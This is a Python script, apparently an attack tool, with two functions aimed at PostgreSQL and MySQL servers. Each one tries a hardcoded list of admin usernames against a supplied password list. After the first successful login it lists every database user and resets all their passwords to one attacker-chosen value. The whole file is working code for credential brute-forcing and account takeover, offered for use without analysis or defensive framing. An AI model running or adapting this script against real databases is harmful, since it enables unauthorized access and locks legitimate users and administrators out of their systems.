import mysql.connector
import psycopg2


ADMIN_USERS = ['root', 'wiki', 'postgres', 'administrator', 'sa', 'admin', 'SA', 'Administrator', 'Admin', 'notroot']


def psql_db_pass_change(host: str, passwords: list[str], new_password: str) -> None:
    cnx = None
    user_found = False
    for user in ADMIN_USERS:
        for password in passwords:
            try:
                cnx = psycopg2.connect(
                    host = host,
                    user = user,
                    password = password
                )
                print(f'Connected via PSQL to {user}@{host} with password: {password}')
                user_found = True
                break
            except psycopg2.Error as err:
                pass
        if user_found:
            break

    if cnx:
        cnx.autocommit = True
        cursor = cnx.cursor()

        # Fetch all users
        cursor.execute("SELECT usename FROM pg_catalog.pg_user;")
        users = cursor.fetchall()
        print(f"users: {users}")

        for user in users:
            user = user[0]
            try:
                # Construct the SQL query
                # query = psycopg2.sql.SQL("ALTER USER {username} PASSWORD %s;")
                cursor.execute(f"ALTER USER {user} PASSWORD %s;", (new_password,))
                print(f"Password for {user}@{host} changed to: {new_password}")
            except psycopg2.Error:
                print(f'unable to change password for user: {user}')
    else:
        print(f'Could not connect to {host}')



def mysql_db_pass_change(host: str, passwords: list[str], new_password: str) -> None:
    cnx = None
    user_found = False
    for user in ADMIN_USERS:
        for password in passwords:
            try:
                cnx = mysql.connector.connect(
                    host = host,
                    user = user,
                    password = password
                )
                print(f'Connected via MYSQL to {user}@{host} with password: {password}')
                user_found = True
                break
            except mysql.connector.Error as err:
                pass
        if user_found:
            break
    if cnx:
        cursor = cnx.cursor()
        query = "SELECT user FROM mysql.user WHERE host = '%';"
        cursor.execute(query)
        users = cursor.fetchall()
        print(f"users with host %: {users}")
        # Update each user's password
        for user in users:
            user = user[0]
            update_query1 = f"ALTER USER '{user}'@'%' IDENTIFIED BY %s;"
            update_query2 = f"SET PASSWORD FOR '{user}'@'%' = PASSWORD(%s);"
            try:
                cursor.execute(update_query1, (new_password,))
            except mysql.connector.Error as err:
                try:
                    cursor.execute(update_query2, (new_password,))
                except mysql.connector.Error as err:
                    print(f'unable to change password for user: {user}')
                    continue
            print(f"Password for {user}@{host} changed to: {new_password}")

        # Commit changes
        cnx.commit()
    else:
        print(f'Could not connect to {host}')
